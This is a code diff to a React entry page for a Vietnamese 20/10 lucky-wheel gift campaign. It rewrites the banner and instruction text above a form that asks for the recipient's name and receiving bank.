@@ -32,9 +32,9 @@ export default function EntryPage() {
   }
 
   return <AppShell><div className="entry-page">
-    <section className="campaign-banner"><div className="banner-icon"><Gift size={20} /></div><div><b>Sẵn sàng nhận quà 20/10?</b><span>Điền thông tin để bắt đầu vòng quay may mắn của bạn.</span></div></section>
+    <section className="campaign-banner"><div className="banner-icon"><Gift size={20} /></div><div><b>Một món quà nhỏ dành cho bạn</b><span>Điền thông tin để bắt đầu vòng quay may mắn.</span></div></section>
     <section className="entry-card">
-      <p className="section-kicker">▧ Nhập thông tin nhận quà</p><p className="section-copy">Điền thông tin chính xác, quà sẽ được tự động chuyển ngay sau khi quay!</p>
+      <p className="section-kicker">Thông tin nhận quà</p><p className="section-copy">Vui lòng điền thông tin chính xác để chúng tôi ghi nhận phần quà của bạn.</p>
       <form onSubmit={submit} noValidate>
         <label>Họ và Tên của Chị <em>*</em><span className="field"><UserRound size={15} /><input value={form.name} onChange={(e) => update('name', e.target.value)} placeholder="Nguyễn Thị Mai Lan" autoComplete="name" /></span></label>
         <label>Ngân hàng nhận thưởng (24/7) <em>*</em><BankSelect value={form.bank} onChange={(bank) => update('bank', bank)} /></label>
